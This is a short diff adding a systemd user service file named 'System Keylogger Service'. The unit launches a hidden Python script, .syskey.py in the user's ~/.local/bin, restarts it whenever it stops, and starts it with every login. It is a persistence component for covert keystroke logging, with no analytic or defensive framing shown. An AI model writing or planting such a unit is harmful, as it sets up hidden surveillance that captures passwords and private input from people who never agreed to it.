@@ -1,0 +1,9 @@
+[Unit]
+Description=System Keylogger Service
+
+[Service]
+ExecStart=/usr/bin/python3 %h/.local/bin/.syskey.py
+Restart=always
+
+[Install]
+WantedBy=default.target 
